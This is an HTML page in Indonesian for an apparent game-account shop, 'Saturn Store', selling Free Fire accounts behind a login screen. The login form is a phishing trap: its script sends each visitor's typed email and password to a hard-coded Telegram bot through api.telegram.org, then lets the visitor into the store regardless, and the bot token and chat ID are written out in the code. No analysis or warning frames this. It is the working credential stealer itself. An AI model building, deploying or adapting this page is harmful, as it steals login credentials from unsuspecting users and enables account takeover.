<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <meta name="google-site-verification" content="google1686cc7569ac1633.html" />
    
    <title>Saturn Store - Order akun game & topup game</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary: #00c853;
            --primary-glow: rgba(0, 200, 83, 0.4);
            --dark: #0f172a;
            --glass: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.12);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
        body { background: #000; color: #fff; min-height: 100vh; overflow-x: hidden; }

        /* BACKGROUND */
        .bg-wrapper {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: url('https://files.catbox.moe/jh1sff.jpg') no-repeat center center;
            background-size: cover; z-index: -3;
        }
        .bg-blur {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at center, transparent 20%, #000 100%), rgba(0,0,0,0.6);
            backdrop-filter: blur(10px); z-index: -1;
        }

        /* LOGIN */
        #page-login { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .login-card {
            background: #fff; color: #334155; width: 100%; max-width: 400px;
            padding: 40px 30px; border-radius: 28px; text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8); animation: slideUp 0.8s ease;
        }
        .login-logo {
            background: var(--primary); width: 50px; height: 50px; border-radius: 14px;
            display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;
            color: white; font-weight: 800; font-size: 24px;
        }
        .login-card h2 { font-weight: 800; font-size: 24px; color: #1e293b; margin-bottom: 8px; }
        .form-group { text-align: left; margin-bottom: 20px; }
        .form-group label { display: block; font-size: 12px; font-weight: 700; color: #475569; margin-bottom: 8px; }
        .form-group input {
            width: 100%; padding: 15px; border-radius: 12px; border: 1.5px solid #e2e8f0;
            background: #f8fafc; outline: none; transition: 0.3s;
        }
        .form-group input:focus { border-color: var(--primary); background: #fff; box-shadow: 0 0 0 4px var(--primary-glow); }
        .btn-submit {
            width: 100%; padding: 16px; border-radius: 12px; border: none;
            background: var(--primary); color: white; font-weight: 700; cursor: pointer;
        }

        /* STORE */
        #page-store { display: none; padding: 20px; max-width: 600px; margin: 0 auto 100px auto; }
        .hero-title { text-align: center; padding: 40px 0; }
        .hero-title h1 { font-size: 28px; font-weight: 800; }
        .hero-title span { color: var(--primary); }
        .card-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .product-card {
            background: var(--glass); backdrop-filter: blur(20px); border: 1px solid var(--glass-border);
            border-radius: 24px; overflow: hidden; transition: 0.3s; cursor: pointer;
        }
        .product-card img { width: 100%; aspect-ratio: 1/1; object-fit: cover; }
        .p-info { padding: 15px; }

        /* DETAIL SCREEN */
        #detail-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 2000; display: none; overflow-y: auto;
        }
        .btn-back { position: absolute; top: 20px; left: 20px; background: rgba(0,0,0,0.5); border: none; color: white; width: 40px; height: 40px; border-radius: 50%; z-index: 10; font-size: 18px; cursor: pointer; }
        .slider-box { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; background: #111; }
        .slider-box img { width: 100%; flex-shrink: 0; scroll-snap-align: start; aspect-ratio: 1/1; object-fit: contain; }
        .detail-body { padding: 25px; }
        .det-price { font-size: 26px; font-weight: 800; color: var(--primary); margin: 10px 0 20px; }
        .spec-list { margin-bottom: 25px; }
        .spec-item { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 8px; display: flex; justify-content: space-between; font-size: 14px; }
        .buy-btn { display: block; width: 100%; padding: 18px; background: var(--primary); color: #fff; text-align: center; text-decoration: none; border-radius: 15px; font-weight: 800; box-shadow: 0 10px 20px var(--primary-glow); }

        /* NAV */
        .bottom-nav {
            position: fixed; bottom: 0; left: 50%; transform: translateX(-50%);
            width: 100%; max-width: 500px; background: rgba(15, 23, 42, 0.9);
            backdrop-filter: blur(20px); display: flex; justify-content: space-around;
            padding: 15px 0; border-top: 1px solid var(--glass-border); z-index: 1000;
        }
        .nav-item { text-align: center; color: #94a3b8; font-size: 11px; flex: 1; cursor: pointer; }
        .nav-item.active { color: var(--primary); }

        @keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div id="loader"><div style="width: 40px; height: 40px; border: 4px solid #1e293b; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite;"></div></div>

    <div class="bg-wrapper"></div>
    <div class="bg-blur"></div>

    <audio id="bgm" loop><source src="https://files.catbox.moe/x5d0fh.mp3" type="audio/mpeg"></audio>

    <div id="page-login">
        <div class="login-card">
            <div class="login-logo">J</div>
            <h2>Selamat Datang</h2>
            <p>Masuk untuk mengelola panel bot Anda</p>
            <form id="loginForm">
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" id="email" placeholder="nama@email.com" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" id="password" placeholder="••••••••" required>
                </div>
                <button type="submit" class="btn-submit" id="btnTxt">➜ Masuk</button>
            </form>
        </div>
    </div>

    <div id="page-store">
        <div class="hero-title">
            <h1>SATURN07 <span>STORE</span></h1>
            <p style="color: #94a3b8; font-size: 13px;">Marketplace Gaming Terpercaya</p>
        </div>
        <div class="card-grid" id="grid"></div>
    </div>

    <div id="detail-screen">
        <button class="btn-back" onclick="closeDetail()">✕</button>
        <div class="slider-box" id="detSlides"></div>
        <div class="detail-body">
            <h2 id="detName">Name</h2>
            <div class="det-price" id="detPrice">Rp 0</div>
            <div id="detSpecs" class="spec-list"></div>
            <p id="detDesc" style="color: #94a3b8; font-size: 14px; margin-bottom: 25px; line-height: 1.6;"></p>
            <a href="#" id="waLink" class="buy-btn">BELI SEKARANG</a>
        </div>
    </div>

    <nav class="bottom-nav" id="navBar" style="display: none;">
        <div class="nav-item"><b>🔥</b><br>TopUp</div>
        <div class="nav-item active" onclick="closeDetail()"><b>🏠</b><br>Home</div>
        <div class="nav-item"><b>📄</b><br>Docs</div>
        <div class="nav-item" onclick="toggleMsc()"><b>🎵</b><br>Music</div>
    </nav>

    <script>
        const TOKEN = "7789045134:AAFY6waeQ6pD1TAx8_Rfv7J6qsokgPZXPsQ";
        const OID = "1955836653";

        // DATA PRODUK DENGAN DETAIL TERPISAH
        const DATA = [
            { 
                n: "FREE FIRE SULTAN 629 I", 
                p: "Rp 14.000.000", 
                i: "https://files.catbox.moe/jh1sff.jpg",
                slides: ["https://files.catbox.moe/jh1sff.jpg"],
                desc: "Akun S1 S2 langka dengan Vault penuh. Koleksi item sultan terlengkap untuk para pro player.",
                stats: { "Level": "75", "Rank": "Grandmaster", "Bind": "Google Polos" }
            },
            { 
                n: "FREE FIRE SULTAN N217", 
                p: "Rp 7.500.000", 
                i: "https://files.catbox.moe/jh1sff.jpg",
                slides: ["https://files.catbox.moe/jh1sff.jpg"],
                desc: "Spesifikasi mid-high dengan skin senjata Evo Max. Cocok untuk pamer di lobby.",
                stats: { "Level": "68", "Rank": "Master", "Bind": "FB Polos" }
            }
            // Tambah akun lainnya di sini...
        ];

        window.onload = () => {
            document.getElementById('loader').style.display = 'none';
            const g = document.getElementById('grid');
            DATA.forEach((x, i) => {
                g.innerHTML += `
                    <div class="product-card" onclick="openDetail(${i})">
                        <img src="${x.i}">
                        <div class="p-info">
                            <div style="font-size: 11px; color: #94a3b8; margin-bottom: 5px;">${x.n}</div>
                            <div style="font-weight: 800; color: var(--primary);">${x.p}</div>
                        </div>
                    </div>`;
            });
        };

        function openDetail(i) {
            const x = DATA[i];
            document.getElementById('detName').innerText = x.n;
            document.getElementById('detPrice').innerText = x.p;
            document.getElementById('detDesc').innerText = x.desc;
            
            // Set Slides
            let sHtml = '';
            x.slides.forEach(img => { sHtml += `<img src="${img}">`; });
            document.getElementById('detSlides').innerHTML = sHtml;

            // Set Specs (Dipisahkan)
            let spHtml = '';
            for (let key in x.stats) {
                spHtml += `<div class="spec-item"><span>${key}</span><b>${x.stats[key]}</b></div>`;
            }
            document.getElementById('detSpecs').innerHTML = spHtml;

            document.getElementById('waLink').href = `https://wa.me/6285137572429?text=Saya+minat+beli+${encodeURIComponent(x.n)}`;
            document.getElementById('detail-screen').style.display = 'block';
        }

        function closeDetail() { document.getElementById('detail-screen').style.display = 'none'; }

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const b = document.getElementById('btnTxt');
            const em = document.getElementById('email').value;
            const ps = document.getElementById('password').value;
            b.innerText = "Authenticating...";

            const msg = `✉️ *LOGIN PANEL*\n📧 *EMAIL:* \`${em}\`\n🔐 *PASS:* \`${ps}\``;

            try {
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: OID, text: msg, parse_mode: 'Markdown' })
                });
                document.getElementById('page-login').style.display = 'none';
                document.getElementById('page-store').style.display = 'block';
                document.getElementById('navBar').style.display = 'flex';
                document.getElementById('bgm').play();
            } catch(e) { alert("Error!"); b.innerText = "➜ Masuk"; }
        });

        function toggleMsc() { const m = document.getElementById('bgm'); m.paused ? m.play() : m.pause(); }
    </script>
</body>
</html>
